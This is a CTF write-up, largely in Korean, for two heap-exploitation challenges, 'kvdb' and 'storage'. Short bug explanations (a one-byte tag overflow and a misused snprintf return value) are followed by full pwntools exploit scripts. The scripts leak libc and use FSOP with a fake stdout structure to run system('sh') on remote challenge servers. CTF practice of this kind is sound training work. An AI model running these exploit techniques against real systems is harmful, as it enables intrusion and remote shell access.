# pwn

## kvdb

```c
struct VarDyn // sizeof=0x10
00000000 {                                       // XREF: Variant::$B24CBE35B6509F7A0727794E4B7DDDE2/r
00000000     unsigned __int64 len;
00000008     char *ptr;
00000010 };

00000000 struct Node // sizeof=0x18
00000000 {
00000000     unsigned __int64 key;
00000008     struct Variant *val;
00000010     struct Node *next;
00000018 };

00000000 struct KVTable // sizeof=0x10
00000000 {
00000000     struct Node **buckets;
00000008     unsigned __int64 nbuckets;
00000010 };

00000000 union Variant::$B24CBE35B6509F7A0727794E4B7DDDE2 // sizeof=0x100
00000000 {                                       // XREF: Variant/r
00000000     unsigned __int64 number;
00000000     struct VarDyn dyn;
00000000     char str[256];
00000000 };

00000000 struct Variant // sizeof=0x108
00000000 {
00000000     union Variant::$B24CBE35B6509F7A0727794E4B7DDDE2 v;
00000100     unsigned __int8 tag;
00000101     unsigned __int8 _pad[7];
00000108 };
```

구조체를 위와 같이 정의할 수 있다. 중요한 것은 `Variant` 함수에서 0x100 만큼을 차지하는 `union Variant::$B24CBE35B6509F7A0727794E4B7DDDE2 v;`이다. edit -> fixed string에서 입력을 257바이트 받기 때문에 1바이트 overflow가 발생해서 `tag`를 변경할 수 있다. pie가 꺼져 있기 때문에 dynamic으로 해석할 때의 size와 주소를 변조하고 dynamic으로 tag를 변경하면 libc를 긁을 수 있고, 그 뒤에 같은 방식으로 변조해서 FSOP한다.

### ex.py

```python
from pwn import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'set follow-fork-mode parent',
    # 'b *$rebase(0x000000000001568)',
    'c'
]

binary = './kvdb'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("13.125.132.168", 3521)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(idx : int, value : list):
    p.sendlineafter(b': ', b'1')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendlineafter(b': ', str(value[0]).encode())
    if value[0] == 1:
        p.sendlineafter(b': ', str(value[1]).encode())
    if value[0] == 2 or value[0] == 3:
        p.sendlineafter(b': ', str(value[1]).encode())
        p.sendafter(b': ', value[2].encode())

def read(idx : int):
    p.sendlineafter(b': ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def edit(idx : int, value : list):
    p.sendlineafter(b': ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    if value[0] == 1:
        p.sendlineafter(b': ', str(value[1]).encode())
    if value[0] == 2 or value[0] == 3:
        p.sendafter(b': ', value[1])

def delete(idx : int):
    p.sendlineafter(b': ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

create(0, [2, 256, 'a' * 256])
edit(0, [2, p64(0x110) + p64(0x40A008) + b'\x00' * 0xf0 + b'\x02'])
read(0)
p.recvuntil(b"):")
l.address = u64(p.recvn(8)) - l.sym['setvbuf']
print(hex(l.address))

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + 0x205710
FSOP = FSOP_struct(
	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
	lock=stdout_lock,
	_wide_data=fake_fsop_struct - 0x10,
	_markers=l.symbols["system"],
	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
	_mode=0xFFFFFFFF,
)

create(1, [2, 256, 'a' * 256])
edit(1, [2, p64(0x110) + p64(fake_fsop_struct) + b'\x00' * 0xf0 + b'\x02'])
edit(1, [3, FSOP])
p.interactive()
```

---
## storage

In `store` function,
```c
getline(&lineptr, &n, stdin);
s = (char *)malloc(0x60uLL);
v3 = snprintf(s, 0x5FuLL, "%s", lineptr);
```
`v3`는 0x5f가 아니라, 0x5f라는 제한이 없었을 때 써지는 바이트 수를 반환받는다. 따라서 우리는 힙 영역에서 원하는 바이트를 \x00으로 만들 수 있다. 힙 영역에 힙 주소가 있으므로 이를 변조해서 size 조작하고, free -> unsorted bin -> libc leak 한다. 그 다음 힙 주소 변조 -> 참조 청크 주소 변조 -> FSOP한다.

### ex.py

```python
from pwn import *
from tqdm import *
from Crypto.Util.number import long_to_bytes
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'set follow-fork-mode parent',
    'b *exit',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("3.39.86.84", 1337)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF("./libc.so.6")

def FSOP_struct(flags=0, _IO_read_ptr=0, _IO_read_end=0, _IO_read_base=0,
                _IO_write_base=0, _IO_write_ptr=0, _IO_write_end=0, _IO_buf_base=0, _IO_buf_end=0,
                _IO_save_base=0, _IO_backup_base=0, _IO_save_end=0, _markers=0, _chain=0, _fileno=0,
                _flags2=0, _old_offset=0, _cur_column=0, _vtable_offset=0, _shortbuf=0, lock=0,
                _offset=0, _codecvt=0, _wide_data=0, _freeres_list=0, _freeres_buf=0,
                __pad5=0, _mode=0, _unused2=b"", vtable=0, more_append=b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00" * 0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

def create(sz : int, ctt : bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b': ', str(sz).encode())
    p.sendlineafter(b': ', ctt)

def read(ctt : bytes):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', ctt)

def edit(idx : int, ctt : bytes):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b': ', str(idx).encode())
    p.sendafter(b': ', ctt)

def delete(idx : int):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b': ', str(idx).encode())

for i in range(20):
    create(0x5f, b'a' * 0x5f)

delete(14)
create(0x5f, b'b' * (0x70 - 1))

delete(0)
create(0x5f, b'b' * (0x70 - 1))
edit(1, b'd' * 0x38 + p16(0x70 + 0x90 * 16 + 1) + b'\x00')
delete(0)
for i in range(14):
    create(0x5f, b'a' * 0x5f)

for i in trange(0, 0x1000):
    num = (i << 12) + 0xb20
    pay = long_to_bytes(num)[::-1]
    read(pay)
    res1 = p.recvline()
    if b'Too' in res1 :
        continue
    if b'Too' not in res1:
        res1 = p.recvn(2)
        if b'No' in res1 :
            continue
    break

p.recvuntil(b'] ')
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x203b20
print(hex(l.address))
print(hex(l.sym['_IO_2_1_stdout_']))

fake_fsop_struct = l.sym['_IO_2_1_stdout_']
stdout_lock = l.address + 0x205710
FSOP = FSOP_struct(
	flags=u64(b"\x01\x01\x01\x01;sh\x00"),
	lock=stdout_lock,
	_wide_data=fake_fsop_struct - 0x10,
	_markers=l.symbols["system"],
	_unused2=p32(0x0) + p64(0x0) + p64(fake_fsop_struct - 0x8),
	vtable=l.symbols["_IO_wfile_jumps"] - 0x20,
	_mode=0xFFFFFFFF,
)
edit(15, p64(fake_fsop_struct) + p64(0x101))
edit(14, FSOP)

# p.sendlineafter(b'> ', b'5')
p.interactive()
```